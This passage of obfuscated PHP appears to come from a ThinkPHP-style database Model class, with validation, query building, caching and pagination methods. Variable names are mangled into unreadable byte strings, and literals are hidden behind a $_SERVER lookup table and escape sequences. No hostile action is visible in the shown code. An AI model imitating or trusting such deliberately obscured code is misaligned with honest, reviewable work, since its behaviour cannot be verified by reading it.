$ş¤ÏşëŸ = array($Šı»¨Úû[354] => $Šı»¨Úû[355], $Šı»¨Úû[356] => $Šı»¨Úû[357], $Šı»¨Úû[358] => $Šı»¨Úû[359], $Šı»¨Úû[360] => $Šı»¨Úû[361], $Šı»¨Úû[362] => $Šı»¨Úû[363], $Šı»¨Úû[364] => $Šı»¨Úû[365], $Šı»¨Úû[366] => $Šı»¨Úû[367], $Šı»¨Úû[341] => $Šı»¨Úû[368], $Šı»¨Úû[369] => $Šı»¨Úû[370]); if (isset($ş¤ÏşëŸ[strtolower($î·»çÛ)])) { $î·»çÛ = $ş¤ÏşëŸ[strtolower($î·»çÛ)]; } return preg_match($î·»çÛ, $¦Ôçú´Ü) === 1; } private function autoOperation(&$†¼˜İó¥, $ŒâŸ²½ ) { $¬ÙŠÔÆ” =& $_SERVER[³à¼î¯á]; if (!empty($this->options[$¬ÙŠÔÆ”[371]])) { $îçòæŸ = $this->options[$¬ÙŠÔÆ”[371]]; unset($this->options[$¬ÙŠÔÆ”[371]]); } elseif (!empty($this->_auto)) { $îçòæŸ = $this->_auto; } if (isset($îçòæŸ)) { foreach ($îçòæŸ as $æ¥¹õÍ©) { if (empty($æ¥¹õÍ©[2])) { $æ¥¹õÍ©[2] = THINK_MODEL_INSERT; } if ($ŒâŸ²½  == $æ¥¹õÍ©[2] || $æ¥¹õÍ©[2] == THINK_MODEL_BOTH) { switch (trim($æ¥¹õÍ©[3])) { case $¬ÙŠÔÆ”[372]: case $¬ÙŠÔÆ”[373]: $ƒ¡Œ»¦ = isset($æ¥¹õÍ©[4]) ? (array) $æ¥¹õÍ©[4] : array(); if (isset($†¼˜İó¥[$æ¥¹õÍ©[0]])) { array_unshift($ƒ¡Œ»¦, $†¼˜İó¥[$æ¥¹õÍ©[0]]); } if ($¬ÙŠÔÆ”[372] == $æ¥¹õÍ©[3]) { $†¼˜İó¥[$æ¥¹õÍ©[0]] = call_user_func_array($æ¥¹õÍ©[1], $ƒ¡Œ»¦); } else { $†¼˜İó¥[$æ¥¹õÍ©[0]] = call_user_func_array(array(&$this, $æ¥¹õÍ©[1]), $ƒ¡Œ»¦); } break; case $¬ÙŠÔÆ”[325]: $†¼˜İó¥[$æ¥¹õÍ©[0]] = $†¼˜İó¥[$æ¥¹õÍ©[1]]; break; case $¬ÙŠÔÆ”[374]: if ($¬ÙŠÔÆ”[12] === $†¼˜İó¥[$æ¥¹õÍ©[0]]) { unset($†¼˜İó¥[$æ¥¹õÍ©[0]]); } break; case $¬ÙŠÔÆ”[375]: default: $†¼˜İó¥[$æ¥¹õÍ©[0]] = $æ¥¹õÍ©[1]; } if (!1 === $†¼˜İó¥[$æ¥¹õÍ©[0]]) { unset($†¼˜İó¥[$æ¥¹õÍ©[0]]); } } } } return $†¼˜İó¥; } protected function autoValidation($’ÂÈ¿óş, $·€‚³–Ù) { $èâŞ©ğ =& $_SERVER[³à¼î¯á]; if (!empty($this->options[$èâŞ©ğ[376]])) { $ôÆÓğË = $this->options[$èâŞ©ğ[376]]; unset($this->options[$èâŞ©ğ[376]]); } elseif (!empty($this->_validate)) { $ôÆÓğË = $this->_validate; } if (isset($ôÆÓğË)) { if ($this->patchValidate) { $this->error = array(); } foreach ($ôÆÓğË as $¼À°Ôõ => $å¬Ç·ãü) { if (empty($å¬Ç·ãü[5]) || $å¬Ç·ãü[5] == THINK_MODEL_BOTH || $å¬Ç·ãü[5] == $·€‚³–Ù) { if (0 == strpos($å¬Ç·ãü[2], $èâŞ©ğ[377]) && strpos($å¬Ç·ãü[2], $èâŞ©ğ[378])) { $å¬Ç·ãü[2] = think_lang(substr($å¬Ç·ãü[2], 2, -1)); } $å¬Ç·ãü[3] = isset($å¬Ç·ãü[3]) ? $å¬Ç·ãü[3] : THINK_EXISTS_VALIDATE; $å¬Ç·ãü[4] = isset($å¬Ç·ãü[4]) ? $å¬Ç·ãü[4] : $èâŞ©ğ[379]; switch ($å¬Ç·ãü[3]) { case THINK_MUST_VALIDATE: if (!1 === $this->_validationField($’ÂÈ¿óş, $å¬Ç·ãü)) { return !1; } break; case THINK_VALUE_VALIDATE: if ($èâŞ©ğ[12] != trim($’ÂÈ¿óş[$å¬Ç·ãü[0]])) { if (!1 === $this->_validationField($’ÂÈ¿óş, $å¬Ç·ãü)) { return !1; } } break; default: if (isset($’ÂÈ¿óş[$å¬Ç·ãü[0]])) { if (!1 === $this->_validationField($’ÂÈ¿óş, $å¬Ç·ãü)) { return !1; } } } } } if (!empty($this->error)) { return !1; } } return !0; } protected function _validationField($¢¤ö¸ö‰, $ÀÏãˆ÷ù) { if (!1 === $this->_validationFieldItem($¢¤ö¸ö‰, $ÀÏãˆ÷ù)) { if ($this->patchValidate) { $this->error[$ÀÏãˆ÷ù[0]] = $ÀÏãˆ÷ù[2]; } else { $this->error = $ÀÏãˆ÷ù[2]; return !1; } } return; } protected function _validationFieldItem($¸¾Çù, $°ÈµåÖø) { $Ê³¢¬¨ =& $_SERVER[³à¼î¯á]; switch (strtolower(trim($°ÈµåÖø[4]))) { case $Ê³¢¬¨[372]: case $Ê³¢¬¨[373]: $šÅÅ™šæ = isset($°ÈµåÖø[6]) ? (array) $°ÈµåÖø[6] : array(); if (is_string($°ÈµåÖø[0]) && strpos($°ÈµåÖø[0], $Ê³¢¬¨[50])) { $°ÈµåÖø[0] = explode($Ê³¢¬¨[50], $°ÈµåÖø[0]); } if (is_array($°ÈµåÖø[0])) { foreach ($°ÈµåÖø[0] as $õËàëËÒ) { $¹Ã¯ÁŸñ[$õËàëËÒ] = $¸¾Çù[$õËàëËÒ]; } array_unshift($šÅÅ™šæ, $¹Ã¯ÁŸñ); } else { array_unshift($šÅÅ™šæ, $¸¾Çù[$°ÈµåÖø[0]]); } if ($Ê³¢¬¨[372] == $°ÈµåÖø[4]) { return call_user_func_array($°ÈµåÖø[1], $šÅÅ™šæ); } else { return call_user_func_array(array(&$this, $°ÈµåÖø[1]), $šÅÅ™šæ); } case $Ê³¢¬¨[380]: return $¸¾Çù[$°ÈµåÖø[0]] == $¸¾Çù[$°ÈµåÖø[1]]; case $Ê³¢¬¨[381]: if (is_string($°ÈµåÖø[0]) && strpos($°ÈµåÖø[0], $Ê³¢¬¨[50])) { $°ÈµåÖø[0] = explode($Ê³¢¬¨[50], $°ÈµåÖø[0]); } $ âë‚İ£ = array(); if (is_array($°ÈµåÖø[0])) { foreach ($°ÈµåÖø[0] as $õËàëËÒ) { $ âë‚İ£[$õËàëËÒ] = $¸¾Çù[$õËàëËÒ]; } } else { $ âë‚İ£[$°ÈµåÖø[0]] = $¸¾Çù[$°ÈµåÖø[0]]; } if (!empty($¸¾Çù[$this->getPk()])) { $ âë‚İ£[$this->getPk()] = array($Ê³¢¬¨[382], $¸¾Çù[$this->getPk()]); } if ($this->where($ âë‚İ£)->find()) { return !1; } return !0; default: return $this->check($¸¾Çù[$°ÈµåÖø[0]], $°ÈµåÖø[1], $°ÈµåÖø[4]); } } public function check($ò¾ÒÑê, $äÜİé¸Ú, $üÀƒ¸Ä„ = "\x72\145\147\145\x78") { $ç³á¹¾¸ =& $_SERVER[³à¼î¯á]; $üÀƒ¸Ä„ = strtolower(trim($üÀƒ¸Ä„)); switch ($üÀƒ¸Ä„) { case $ç³á¹¾¸[7]: case $ç³á¹¾¸[383]: $œºÍìñû = is_array($äÜİé¸Ú) ? $äÜİé¸Ú : explode($ç³á¹¾¸[50], $äÜİé¸Ú); return $üÀƒ¸Ä„ == $ç³á¹¾¸[7] ? in_array($ò¾ÒÑê, $œºÍìñû) : !in_array($ò¾ÒÑê, $œºÍìñû); case $ç³á¹¾¸[384]: case $ç³á¹¾¸[385]: if (is_array($äÜİé¸Ú)) { $æÏÁûûå = $äÜİé¸Ú[0]; $ûàãØ = $äÜİé¸Ú[1]; } else { list($æÏÁûûå, $ûàãØ) = explode($ç³á¹¾¸[50], $äÜİé¸Ú); } return $üÀƒ¸Ä„ == $ç³á¹¾¸[384] ? $ò¾ÒÑê >= $æÏÁûûå && $ò¾ÒÑê <= $ûàãØ : $ò¾ÒÑê < $æÏÁûûå || $ò¾ÒÑê > $ûàãØ; case $ç³á¹¾¸[386]: case $ç³á¹¾¸[387]: return $üÀƒ¸Ä„ == $ç³á¹¾¸[386] ? $ò¾ÒÑê == $äÜİé¸Ú : $ò¾ÒÑê != $äÜİé¸Ú; case $ç³á¹¾¸[388]: $ˆ¬¶ôÇ¾ = mb_strlen($ò¾ÒÑê, $ç³á¹¾¸[389]); if (strpos($äÜİé¸Ú, $ç³á¹¾¸[50])) { list($æÏÁûûå, $ûàãØ) = explode($ç³á¹¾¸[50], $äÜİé¸Ú); return $ˆ¬¶ôÇ¾ >= $æÏÁûûå && $ˆ¬¶ôÇ¾ <= $ûàãØ; } else { return $ˆ¬¶ôÇ¾ == $äÜİé¸Ú; } case $ç³á¹¾¸[390]: list($¹çÆÚ°Æ, $œÆ¼ˆª”) = explode($ç³á¹¾¸[50], $äÜİé¸Ú); if (!is_numeric($¹çÆÚ°Æ)) { $¹çÆÚ°Æ = strtotime($¹çÆÚ°Æ); } if (!is_numeric($œÆ¼ˆª”)) { $œÆ¼ˆª” = strtotime($œÆ¼ˆª”); } return NOW_TIME >= $¹çÆÚ°Æ && NOW_TIME <= $œÆ¼ˆª”; case $ç³á¹¾¸[391]: return in_array(get_client_ip(), explode($ç³á¹¾¸[50], $äÜİé¸Ú)); case $ç³á¹¾¸[392]: return !in_array(get_client_ip(), explode($ç³á¹¾¸[50], $äÜİé¸Ú)); case $ç³á¹¾¸[379]: default: return $this->regex($ò¾ÒÑê, $äÜİé¸Ú); } } public function query($ºîºŠ««, $áŠ¾Èº¶ = false) { $¶àÍµæ =& $_SERVER[³à¼î¯á]; if (!is_bool($áŠ¾Èº¶) && !is_array($áŠ¾Èº¶)) { $áŠ¾Èº¶ = func_get_args(); array_shift($áŠ¾Èº¶); } $ºîºŠ«« = str_replace(array($¶àÍµæ[253], $¶àÍµæ[393]), $¶àÍµæ[53], $ºîºŠ««); $ºîºŠ«« = $this->parseSql($ºîºŠ««, $áŠ¾Èº¶); return $this->db->query($ºîºŠ««); } public function execute($£·ë¹¼ˆ, $¼‚ÎÜ = false) { if (!is_bool($¼‚ÎÜ) && !is_array($¼‚ÎÜ)) { $¼‚ÎÜ = func_get_args(); array_shift($¼‚ÎÜ); } $£·ë¹¼ˆ = $this->parseSql($£·ë¹¼ˆ, $¼‚ÎÜ); return $this->db->execute($£·ë¹¼ˆ); } protected function parseSql($ôŠ¨á§ä, $èÑÆüá) { $Å÷—»‹ =& $_SERVER[³à¼î¯á]; if (!0 === $èÑÆüá) { $¤€¾¢°é = $this->_parseOptions(); $ôŠ¨á§ä = $this->db->parseSql($ôŠ¨á§ä, $¤€¾¢°é); } elseif (is_array($èÑÆüá)) { $èÑÆüá = array_map(array($this->db, $Å÷—»‹[394]), $èÑÆüá); $ôŠ¨á§ä = vsprintf($ôŠ¨á§ä, $èÑÆüá); } else { $ôŠ¨á§ä = strtr($ôŠ¨á§ä, array($Å÷—»‹[395] => $this->getTableName(), $Å÷—»‹[396] => think_config($Å÷—»‹[296]))); } $this->db->setModel($this->name); return $ôŠ¨á§ä; } public function db($èÏ¦µ‚Û = '', $®©øÒÀå = '', $úù²Òéß = array()) { $Â–·¥æ« =& $_SERVER[³à¼î¯á]; if ($Â–·¥æ«[12] === $èÏ¦µ‚Û && $this->db) { return $this->db; } static $éº²…µ = array(); static $½’á¶µë = array(); if (!isset($½’á¶µë[$èÏ¦µ‚Û]) || isset($½’á¶µë[$èÏ¦µ‚Û]) && $®©øÒÀå && $éº²…µ[$èÏ¦µ‚Û] != $®©øÒÀå) { if (!empty($®©øÒÀå) && is_string($®©øÒÀå) && !1 === strpos($®©øÒÀå, $Â–·¥æ«[8])) { $®©øÒÀå = think_config($®©øÒÀå); } $èÏ¦µ‚Û = think_guid($®©øÒÀå); $½’á¶µë[$èÏ¦µ‚Û] = Db::getInstance($®©øÒÀå); } elseif (NULL === $®©øÒÀå) { $½’á¶µë[$èÏ¦µ‚Û]->close(); unset($½’á¶µë[$èÏ¦µ‚Û]); return; } if (!empty($úù²Òéß)) { if (is_string($úù²Òéß)) { parse_str($úù²Òéß, $úù²Òéß); } foreach ($úù²Òéß as $ùÑı ¸ => $îÜæÊÃ§) { $this->setProperty($ùÑı ¸, $îÜæÊÃ§); } } $éº²…µ[$èÏ¦µ‚Û] = $®©øÒÀå; $this->db = $½’á¶µë[$èÏ¦µ‚Û]; $this->_after_db(); if (!empty($this->name) && $this->autoCheckFields) { $this->_checkTableInfo(); } return $this; } protected function _after_db() { } public function getModelName() { if (empty($this->name)) { $µ®à‹ÉÄ = get_class($this); if ($µ®à‹ÉÄ == $_SERVER[³à¼î¯á][397]) { return $this->name; } $this->name = substr($µ®à‹ÉÄ, 0, -5); } return $this->name; } public function getTableName() { $— ›Îéª =& $_SERVER[³à¼î¯á]; if (empty($this->trueTableName)) { $ÇæÅÂÊ— = !empty($this->tablePrefix) ? $this->tablePrefix : $— ›Îéª[12]; if (!empty($this->tableName)) { $ÇæÅÂÊ— .= $this->tableName; } else { $ÇæÅÂÊ— .= think_parse_name($this->name); } $this->trueTableName = strtolower($ÇæÅÂÊ—); } return (!empty($this->dbName) ? $this->dbName . $— ›Îéª[10] : $— ›Îéª[12]) . $this->trueTableName; } public function startTrans() { $this->commit(); $this->db->startTrans(); return; } public function commit() { return $this->db->commit(); } public function rollback() { return $this->db->rollback(); } public function getError() { return $this->error; } public function getDbError() { return $this->db->getError(); } public function getLastInsID() { return $this->db->getLastInsID(); } public function getLastSql() { return $this->db->getLastSql($this->name); } public function _sql() { return $this->getLastSql(); } public function getPk() { $÷È°­Œ =& $_SERVER[³à¼î¯á]; return isset($this->fields[$÷È°­Œ[303]]) ? $this->fields[$÷È°­Œ[303]] : $this->pk; } public function getDbFields() { $ŠŞƒ€‡ù =& $_SERVER[³à¼î¯á]; if (isset($this->options[$ŠŞƒ€‡ù[331]])) { $‹Éà¦şë = $this->db->getFields($this->options[$ŠŞƒ€‡ù[331]]); return $‹Éà¦şë ? array_keys($‹Éà¦şë) : !1; } if ($this->fields) { $‹Éà¦şë = $this->fields; unset($‹Éà¦şë[$ŠŞƒ€‡ù[302]], $‹Éà¦şë[$ŠŞƒ€‡ù[303]], $‹Éà¦şë[$ŠŞƒ€‡ù[304]], $‹Éà¦şë[$ŠŞƒ€‡ù[301]]); return $‹Éà¦şë; } return !1; } public function data($Û¢ÅøêÑ = '') { $¿³ÜÏ§Ò =& $_SERVER[³à¼î¯á]; if ($¿³ÜÏ§Ò[12] === $Û¢ÅøêÑ && !empty($this->data)) { return $this->data; } if (is_object($Û¢ÅøêÑ)) { $Û¢ÅøêÑ = get_object_vars($Û¢ÅøêÑ); } elseif (is_string($Û¢ÅøêÑ)) { parse_str($Û¢ÅøêÑ, $Û¢ÅøêÑ); } elseif (!is_array($Û¢ÅøêÑ)) { think_exception(think_lang($¿³ÜÏ§Ò[323])); } $this->data = $Û¢ÅøêÑ; return $this; } public function join($±Æó€Ï) { $Ëù‚ò½ =& $_SERVER[³à¼î¯á]; if (is_array($±Æó€Ï)) { $this->options[$Ëù‚ò½[334]] = $±Æó€Ï; } elseif (!empty($±Æó€Ï)) { $this->options[$Ëù‚ò½[334]][] = $±Æó€Ï; } return $this; } public function union($€†˜·Ğ, $²ª§Ä¦­ = false) { $°Ç–œä“ =& $_SERVER[³à¼î¯á]; if (empty($€†˜·Ğ)) { return $this; } if ($²ª§Ä¦­) { $this->options[$°Ç–œä“[398]][$°Ç–œä“[399]] = !0; } if (is_object($€†˜·Ğ)) { $€†˜·Ğ = get_object_vars($€†˜·Ğ); } if (is_string($€†˜·Ğ)) { $¡òª™°¼ = $€†˜·Ğ; } elseif (is_array($€†˜·Ğ)) { if (isset($€†˜·Ğ[0])) { $this->options[$°Ç–œä“[398]] = array_merge($this->options[$°Ç–œä“[398]], $€†˜·Ğ); return $this; } else { $¡òª™°¼ = $€†˜·Ğ; } } else { think_exception(think_lang($°Ç–œä“[323])); } $this->options[$°Ç–œä“[398]][] = $¡òª™°¼; return $this; } public function cache($“ê¿Ä  = true, $¶ÆŠˆí´ = null, $ïãµ˜ŠÏ = '') { $Ü‘ÈóæÆ =& $_SERVER[³à¼î¯á]; if (!1 !== $“ê¿Ä ) { $this->options[$Ü‘ÈóæÆ[400]] = array($Ü‘ÈóæÆ[97] => $“ê¿Ä , $Ü‘ÈóæÆ[390] => $¶ÆŠˆí´, $Ü‘ÈóæÆ[33] => $ïãµ˜ŠÏ); } return $this; } public function field($Ìë±îÜê, $£¼Ì£™ = false) { $ùÕŞ€ş =& $_SERVER[³à¼î¯á]; if (!0 === $Ìë±îÜê) { $±ü¾ğïÚ = $this->getDbFields(); $Ìë±îÜê = $±ü¾ğïÚ ? $±ü¾ğïÚ : $ùÕŞ€ş[211]; } elseif ($£¼Ì£™) { if (is_string($Ìë±îÜê)) { $Ìë±îÜê = explode($ùÕŞ€ş[50], $Ìë±îÜê); } $±ü¾ğïÚ = $this->getDbFields(); $Ìë±îÜê = $±ü¾ğïÚ ? array_diff($±ü¾ğïÚ, $Ìë±îÜê) : $Ìë±îÜê; } $this->options[$ùÕŞ€ş[325]] = $Ìë±îÜê; return $this; } public function scope($Í€ ‚Ùº = '', $¶û ëø¨ = NULL) { $¤ã®¢ =& $_SERVER[³à¼î¯á]; if ($¤ã®¢[12] === $Í€ ‚Ùº) { if (isset($this->_scope[$¤ã®¢[37]])) { $ûÅ’ÏÑö = $this->_scope[$¤ã®¢[37]]; } else { return $this; } } elseif (is_string($Í€ ‚Ùº)) { $ÒÀÌª = explode($¤ã®¢[50], $Í€ ‚Ùº); $ûÅ’ÏÑö = array(); foreach ($ÒÀÌª as $Ï‘ıú¶ı) { if (!isset($this->_scope[$Ï‘ıú¶ı])) { continue; } $ûÅ’ÏÑö = array_merge($ûÅ’ÏÑö, $this->_scope[$Ï‘ıú¶ı]); } if (!empty($¶û ëø¨) && is_array($¶û ëø¨)) { $ûÅ’ÏÑö = array_merge($ûÅ’ÏÑö, $¶û ëø¨); } } elseif (is_array($Í€ ‚Ùº)) { $ûÅ’ÏÑö = $Í€ ‚Ùº; } if (is_array($ûÅ’ÏÑö) && !empty($ûÅ’ÏÑö)) { $this->options = array_merge($this->options, array_change_key_case($ûÅ’ÏÑö)); } return $this; } public function where($›ƒã³ºä, $¾úÕèÊ™ = null) { $ô“¸î‹¶ =& $_SERVER[³à¼î¯á]; if (!is_null($¾úÕèÊ™) && is_string($›ƒã³ºä)) { if (!is_array($¾úÕèÊ™)) { $¾úÕèÊ™ = func_get_args(); array_shift($¾úÕèÊ™); } $¾úÕèÊ™ = array_map(array($this->db, $ô“¸î‹¶[394]), $¾úÕèÊ™); $›ƒã³ºä = vsprintf($›ƒã³ºä, $¾úÕèÊ™); } elseif (is_object($›ƒã³ºä)) { $›ƒã³ºä = get_object_vars($›ƒã³ºä); } elseif (is_array($›ƒã³ºä)) { foreach ($›ƒã³ºä as $Ö‹Êáù… => $ºŸéß¥â) { if ((is_numeric($Ö‹Êáù…) || !$Ö‹Êáù…) && is_string($ºŸéß¥â)) { if (strpos($ºŸéß¥â, $ô“¸î‹¶[401]) === 0) { continue; } think_trace($ô“¸î‹¶[402], $ô“¸î‹¶[12], $ô“¸î‹¶[49]); die; } } } if (is_string($›ƒã³ºä) && $ô“¸î‹¶[12] != $›ƒã³ºä) { $´´¹—¶¬ = array(); $´´¹—¶¬[$ô“¸î‹¶[403]] = $›ƒã³ºä; $›ƒã³ºä = $´´¹—¶¬; } if (isset($this->options[$ô“¸î‹¶[327]])) { $this->options[$ô“¸î‹¶[327]] = array_merge($this->options[$ô“¸î‹¶[327]], $›ƒã³ºä); } else { $this->options[$ô“¸î‹¶[327]] = $›ƒã³ºä; } return $this; } public function limit($çÔ¯û¨Œ, $á¨¶Åğ© = null) { $˜ÄÃ”¾ =& $_SERVER[³à¼î¯á]; $this->options[$˜ÄÃ”¾[343]] = is_null($á¨¶Åğ©) ? $çÔ¯û¨Œ : $çÔ¯û¨Œ . $˜ÄÃ”¾[50] . $á¨¶Åğ©; return $this; } public function page($òâ¼‡å‘, $«ƒÎ£ùœ = null) { $«­§Õ÷ =& $_SERVER[³à¼î¯á]; $this->options[$«­§Õ÷[404]] = is_null($«ƒÎ£ùœ) ? $òâ¼‡å‘ : $òâ¼‡å‘ . $«­§Õ÷[50] . $«ƒÎ£ùœ; return $this; } public function comment($å†Åîå) { $this->options[$_SERVER[³à¼î¯á][405]] = $å†Åîå; return $this; } public function setProperty($í½“õÚÌ, $Áì±„Õ) { if (property_exists($this, $í½“õÚÌ)) { $this->{$í½“õÚÌ} = $Áì±„Õ; } return $this; } } class ModelBase extends Model { const SQL_WHERE_IN_CHUNK = 2000; protected $dataAuto = array(array("\155\157\144\x69\146\x79\124\x69\x6d\145", "\x74\151\x6d\145", "\x69\156\163\x65\x72\x74\x2c\x75\x70\x64\141\164\x65", "\x66\165\x6e\x63\x74\x69\157\x6e"), array("\143\x72\145\x61\x74\145\x54\151\155\145", "\x74\151\155\x65", "\x69\x6e\x73\145\x72\164", "\x66\x75\156\x63\164\x69\157\x6e")); public function setDataAuto($êö“…£) { $this->dataAuto = $êö“…£; } public function __construct($½Ş¿¿å = '', $µ•ñà‹º = '', $©»ı®ÑÇ = '') { parent::__construct($½Ş¿¿å, $µ•ñà‹º, $©»ı®ÑÇ); } protected $tableMeta = array(); protected function _beforeInsert(&$ôĞ³ÎŞ·, $ŠĞ¹×®) { $ìÓ¬È– =& $_SERVER[³à¼î¯á]; if (!$this->checkDataAutoHas($ìÓ¬È–[406])) { return; } $this->dataBeforeFilter($ôĞ³ÎŞ·, $ìÓ¬È–[406]); } protected function _beforeUpdate(&$«£ŞÔÃ, $ş•ˆØü) { $Èş›´âî =& $_SERVER[³à¼î¯á]; if (!$this->checkDataAutoHas($Èş›´âî[407])) { return; } $this->dataBeforeFilter($«£ŞÔÃ, $Èş›´âî[407]); } protected function _afterSelect(&$ÌÆ„¼ÀÑ, $ÂÙ…Ïšˆ) { if (!is_array($ÌÆ„¼ÀÑ)) { return; } if (!$this->checkDataAutoHas($_SERVER[³à¼î¯á][408])) { return; } foreach ($ÌÆ„¼ÀÑ as &$”Åœ¹¾Ñ) { $this->dataAfterFilter($”Åœ¹¾Ñ); } unset($”Åœ¹¾Ñ); } protected function _afterFind(&$”Õ¬ÈÄ©, $Ä–İë’‚) { if (!is_array($”Õ¬ÈÄ©)) { return; } if (!$this->checkDataAutoHas($_SERVER[³à¼î¯á][408])) { return; } $this->dataAfterFilter($”Õ¬ÈÄ©); } public static function textEncode($«¹Éú­) { if (!$«¹Éú­) { return $«¹Éú­; } $÷©¥¦•¡ = json_encode($«¹Éú­); $÷©¥¦•¡ = preg_replace_callback($_SERVER[³à¼î¯á][409], function ($³ëÙÊ„É) { return addslashes($³ëÙÊ„É[0]); }, $÷©¥¦•¡); return json_decode($÷©¥¦•¡); } public static function textDecode($ÑÜøÖû¦) { $éøÙÀÚ¯ =& $_SERVER[³à¼î¯á]; $ëäÃù = json_encode($ÑÜøÖû¦); $ëäÃù = preg_replace_callback($éøÙÀÚ¯[410], function ($ğñ†÷±¾) { return $_SERVER[³à¼î¯á][100]; }, $ëäÃù); return json_decode($ëäÃù); } public function setAutoIncrement($†«å ˆú) { $É´ê®í = array($this->getPk() => $†«å ˆú); $µÂé°òÏ = $this->data($É´ê®í)->add(); if ($µÂé°òÏ) { $this->delete($µÂé°òÏ); } } public function getAutoIncrement() { $©¨ÍÔ‡– = $this->getTableName(); $ú¡î´ = $this->max($this->getPk()); $Ë’Şê¥¿ = $this->query("\x73\150\x6f\x77\40\x74\141\142\154\x65\40\163\164\x61\164\x75\x73\40\x77\x68\x65\x72\x65\x20\x4e\141\155\x65\x3d\x27{$©¨ÍÔ‡–}\x27"); $Ğû±ùã = $Ë’Şê¥¿[0][$_SERVER[³à¼î¯á][411]]; $ì™ç¿“ = max($ú¡î´, $Ğû±ùã); return $ì™ç¿“; } protected function _callBefore($¸´Íû“Ú, $‚Œ‰ßß) { return $this->cacheCallCheck($¸´Íû“Ú, $‚Œ‰ßß, !1); } protected function _callAfter($ˆ¶°²˜Á, $•¡€–ã³) { return $this->cacheCallCheck($ˆ¶°²˜Á, $•¡€–ã³, !0); } protected function cacheFunctionAlias($ ¬Äï”) { return !1; } public function cacheMemory() { return $this->cache(null, 0); } protected function cacheCallCheck($Îìëâ¬Ã, $¨®Ï¯Ó­, $÷§Íµ·’ = false) { $Ü°ãë‡” = $this->cacheFunctionAlias($¨®Ï¯Ó­); if (!$Ü°ãë‡”) { return; } foreach ($Ü°ãë‡” as $’Æ°Ø– => $÷é¬Á”›) { $Ş€™Ï­ = $÷é¬Á”›[0]; $êÛãØè‹ = explode($_SERVER[³à¼î¯á][50], $÷é¬Á”›[1]); if ($Îìëâ¬Ã == $’Æ°Ø–) { return $this->cacheFunctionGet($’Æ°Ø–, $Ş€™Ï­); } if ($÷§Íµ·’ && in_array($Îìëâ¬Ã, $êÛãØè‹)) { $this->cacheFunctionClear($’Æ°Ø–, $Ş€™Ï­); } } } public function cacheFunctionGet($¸¥Ï»µé, $üÁŞÍì) { $ÜæÚİİú = $this->cacheKeyMake($¸¥Ï»µé, $üÁŞÍì); $çšÏÏ = Cache::get($ÜæÚİİú); if (!is_array($çšÏÏ)) { $çšÏÏ = call_user_func_array(array($this, $¸¥Ï»µé), array($üÁŞÍì, !0)); Cache::set($ÜæÚİİú, $çšÏÏ); } return $çšÏÏ; } public function cacheFunctionClear($Â‚ºÙï„, $ß“‚®åÏ) { $Ì“ÙŞÏÆ = $ß“‚®åÏ; if (!is_array($ß“‚®åÏ)) { $Ì“ÙŞÏÆ = array($ß“‚®åÏ); } foreach ($Ì“ÙŞÏÆ as $åµË‘‚ï) { $”ª…¹¸§ = $this->cacheKeyMake($Â‚ºÙï„, $åµË‘‚ï); Cache::remove($”ª…¹¸§); } } private function cacheKeyMake($§¡­…Ë, $³®–”©) { $şíµÚé =& $_SERVER[³à¼î¯á]; return get_class($this) . $şíµÚé[11] . $§¡­…Ë . $şíµÚé[412] . $³®–”©; } protected function selectPageReset() { $Æ¬¾­… =& $_SERVER[³à¼î¯á]; if (isset($GLOBALS[$Æ¬¾­…[413]])) { return; } $GLOBALS[$Æ¬¾­…[413]] = isset($GLOBALS[$Æ¬¾­…[7]][$Æ¬¾­…[414]]) ? $GLOBALS[$Æ¬¾­…[7]][$Æ¬¾­…[414]] : !1; $GLOBALS[$Æ¬¾­…[415]] = isset($GLOBALS[$Æ¬¾­…[7]][$Æ¬¾­…[404]]) ? $GLOBALS[$Æ¬¾­…[7]][$Æ¬¾­…[404]] : !1; $GLOBALS[$Æ¬¾­…[7]][$Æ¬¾­…[414]] = !1; $GLOBALS[$Æ¬¾­…[7]][$Æ¬¾­…[404]] = !1; } protected function selectPageRestore() { $â»ÔÉÔ =& $_SERVER[³à¼î¯á]; if (!isset($GLOBALS[$â»ÔÉÔ[413]])) { return; } $GLOBALS[$â»ÔÉÔ[7]][$â»ÔÉÔ[414]] = $GLOBALS[$â»ÔÉÔ[413]]; $GLOBALS[$â»ÔÉÔ[7]][$â»ÔÉÔ[404]] = $GLOBALS[$â»ÔÉÔ[415]]; if ($GLOBALS[$â»ÔÉÔ[7]][$â»ÔÉÔ[414]] === !1) { unset($GLOBALS[$â»ÔÉÔ[7]][$â»ÔÉÔ[414]]); } if ($GLOBALS[$â»ÔÉÔ[7]][$â»ÔÉÔ[404]] === !1) { unset($GLOBALS[$â»ÔÉÔ[7]][$â»ÔÉÔ[404]]); } unset($GLOBALS[$â»ÔÉÔ[413]]); unset($GLOBALS[$â»ÔÉÔ[415]]); } protected function selectPage($„ÙÜº = 200, $ß’«ùÌ· = 1) { $¶’éŞÌ =& $_SERVER[³à¼î¯á]; global $in; $óÒáñ½… = $this->optionsValue(); $Ó°ê„¿ = 50000; $„ÙÜº = isset($in[$¶’éŞÌ[414]]) && $in[$¶’éŞÌ[414]] ? $in[$¶’éŞÌ[414]] : $„ÙÜº; if ($„ÙÜº === -1) { $in[$¶’éŞÌ[414]] = !1; $Ó°ê„¿ = 100000000; $„ÙÜº = $Ó°ê„¿; } $ÕøæİÖã = $óÒáñ½…; $ÕøæİÖã[$¶’éŞÌ[416]] = array(); $„ÙÜº = intval($„ÙÜº); $„ÙÜº = $„ÙÜº <= 5 ? 5 : ($„ÙÜº >= $Ó°ê„¿ ? $Ó°ê„¿ : $„ÙÜº); $ß’«ùÌ· = intval(isset($in[$¶’éŞÌ[404]]) && $in[$¶’éŞÌ[404]] ? $in[$¶’éŞÌ[404]] : $ß’«ùÌ·); $ß’«ùÌ· = $ß’«ùÌ· <= 1 ? 1 : $ß’«ùÌ·; $å³¾–Ñ€ = array(); $²ñÛğÁ = 1; if ($ß’«ùÌ· == 1 && $²ñÛğÁ) { $this->optionsValue($óÒáñ½…); $å³¾–Ñ€ = $this->page($ß’«ùÌ·, $„ÙÜº)->select(); $‰Ï¡áœû = is_array($å³¾–Ñ€) ? count($å³¾–Ñ€) : 0; if ($‰Ï¡áœû < $„ÙÜº) { $ß¿áĞÕÍ = 1; } else { $this->optionsValue($ÕøæİÖã); $‰Ï¡áœû = intval($this->count()); $ß¿áĞÕÍ = ceil($‰Ï¡áœû / $„ÙÜº); } } else { $this->optionsValue($ÕøæİÖã); $‰Ï¡áœû = intval($this->count()); $ß¿áĞÕÍ = ceil($‰Ï¡áœû / $„ÙÜº); $ß’«ùÌ· = $ß’«ùÌ· >= $ß¿áĞÕÍ ? $ß¿áĞÕÍ : $ß’«ùÌ·; $this->optionsValue($óÒáñ½…); $å³¾–Ñ€ 